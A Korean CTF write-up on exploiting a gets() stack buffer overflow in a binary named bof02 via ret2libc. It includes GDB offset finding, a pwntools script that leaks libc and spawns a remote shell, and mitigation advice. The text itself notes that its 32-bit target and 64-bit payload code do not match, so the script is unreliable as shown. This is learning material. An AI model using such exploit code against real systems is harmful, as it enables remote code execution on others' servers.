@@ -1,0 +1,148 @@
+<h1 id="section-1">시스템 해킹 라이트업 — BOF02 (Stack Buffer Overflow)</h1>
+<hr>
+<h2 id="section-2">1. 개요</h2>
+<p>BOF와 ret2libc의 정적 분석·디버깅·페이로드 구성 과정을 정리한 학습 문서다. 아래 환경 설명에는 32비트, 코드에는 p64와 pop_rdi를 쓰는 64비트 예시가 혼재한다. 원본 바이너리·실행 로그를 연결한 재현 완료 보고서로 보지 않는다.</p>
+<hr>
+<h2 id="section-3">2. 대상 / 환경</h2>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>항목</th>
+<th>내용</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>파일</td>
+<td>bof02 (ELF 32-bit)</td>
+</tr>
+<tr>
+<td>보호기법</td>
+<td>RELRO: Partial / Stack Canary: None / NX: Enabled / PIE: None</td>
+</tr>
+<tr>
+<td>환경</td>
+<td>Docker 컨테이너 (로컬) + 원격 서버</td>
+</tr>
+<tr>
+<td>도구</td>
+<td>IDA Free 9.0, GDB + pwndbg, pwntools</td>
+</tr>
+</tbody></table></div>
+<hr>
+<h2 id="section-4">3. 정적 분석 — IDA Free</h2>
+<pre><code class="language-c">// 디컴파일 결과 (의사 코드)
+void vuln_func() {
+    char buf[64];
+    gets(buf);   // ← 크기 제한 없음 → BOF 취약
+}
+
+int main() {
+    puts("Input: ");
+    vuln_func();
+    return 0;
+}
+</code></pre>
+<p><strong>발견 사항</strong></p>
+<ul>
+<li><code>gets()</code> 함수 사용 → 버퍼 크기 제한 없이 입력받음</li>
+<li><code>buf</code> 크기: 64바이트</li>
+<li>NX 활성화 → 스택 실행 제한 → ret2libc 등 코드 재사용 방식 검토</li>
+</ul>
+<hr>
+<h2 id="section-5">4. 동적 분석 — GDB + pwndbg</h2>
+<pre><code class="language-bash">gdb ./bof02
+
+# 1. cyclic 패턴 생성 및 입력
+(gdb) run &lt; &lt;(cyclic 200)
+
+# 2. 크래시 확인 → EIP 값 확인
+Program received signal SIGSEGV
+EIP: 0x6161616e  ← cyclic 패턴
+
+# 3. 오프셋 계산
+(gdb) python3 -c "from pwn import *; print(cyclic_find(0x6161616e))"
+76
+</code></pre>
+<p><strong>76바이트는 원문 예시 값</strong>이다. 32비트의 saved EBP 크기와 64비트 페이로드를 혼합해 계산할 수 없으므로 실제 ELF와 cyclic 결과를 기준으로 다시 확인해야 한다.</p>
+<hr>
+<h2 id="section-6">5. 익스플로잇 전략 — ret2libc</h2>
+<pre><code>NX 활성화 → 스택 실행 불가
+PIE 비활성화 → 바이너리 주소 고정
+
+전략: ret2libc
+  1. puts() 또는 printf()로 libc 주소 누출
+  2. libc base = 누출된 주소 - puts 오프셋
+  3. system("/bin/sh") = libc base + system 오프셋
+</code></pre>
+<hr>
+<h2 id="section-7">6. solve.py 참고 예시</h2>
+<p>이 코드는 주소 자리표시자와 64비트 패킹을 포함한다. 위 32비트 환경에 그대로 실행할 수 있는 완성 코드가 아니다. 호출 규약·ELF 비트수·가젯·오프셋을 먼저 맞춰야 한다.</p>
+<pre><code class="language-python">from pwn import *
+
+# 설정
+elf  = ELF("./bof02")
+libc = ELF("./libc.so.6")   # 서버와 동일한 libc
+p    = remote("HOST", PORT)
+
+# 가젯 주소 (PIE 비활성화이므로 고정)
+puts_plt  = elf.plt["puts"]
+puts_got  = elf.got["puts"]
+main_addr = elf.symbols["main"]
+pop_rdi   = 0x[GADGET]       # ROPgadget으로 확인
+
+offset = 76
+
+# STAGE 1: libc 주소 누출
+payload  = b"A" * offset
+payload += p64(pop_rdi)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main_addr)   # main으로 복귀
+
+p.sendlineafter("Input: ", payload)
+leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
+libc.address = leaked - libc.symbols["puts"]
+log.success(f"libc base: {hex(libc.address)}")
+
+# STAGE 2: system("/bin/sh") 호출
+bin_sh  = next(libc.search(b"/bin/sh"))
+system  = libc.symbols["system"]
+ret_gad = 0x[RET_GADGET]    # 스택 정렬용
+
+payload2  = b"A" * offset
+payload2 += p64(ret_gad)    # 16바이트 정렬
+payload2 += p64(pop_rdi)
+payload2 += p64(bin_sh)
+payload2 += p64(system)
+
+p.sendlineafter("Input: ", payload2)
+p.interactive()
+</code></pre>
+<hr>
+<h2 id="section-8">7. 영향도</h2>
+<ul>
+<li>원격 코드 실행 (RCE)</li>
+<li>서버 셸 획득 → 내부 파일 접근 / 권한 상승 가능</li>
+<li>실제 대상과 전제 조건을 재확인하지 않아 확정 CVSS 점수를 기재하지 않는다.</li>
+</ul>
+<hr>
+<h2 id="section-9">8. 대응 방안</h2>
+<pre><code class="language-c">// 취약 코드
+gets(buf);
+
+// 방어 코드
+fgets(buf, sizeof(buf), stdin);
+</code></pre>
+<ul>
+<li><code>gets()</code> 사용 금지 → <code>fgets()</code>, <code>read()</code> 사용</li>
+<li>스택 카나리 활성화 (<code>-fstack-protector-all</code>)</li>
+<li>ASLR + PIE 동시 활성화</li>
+<li>NX 유지 (이미 적용 중)</li>
+</ul>
+<hr>
+<h2 id="section-10">9. 학습한 점</h2>
+<ul>
+<li>ret2libc는 NX가 있어도 "라이브러리 함수"를 재활용하므로 우회 가능</li>
+<li>libc 누출 → base 계산 → 오프셋 더하기 흐름이 핵심 패턴</li>
+<li>스택 정렬(16바이트) 문제로 <code>movaps</code> 오류 발생 시 <code>ret</code> 가젯 하나 추가로 해결</li>
+</ul>
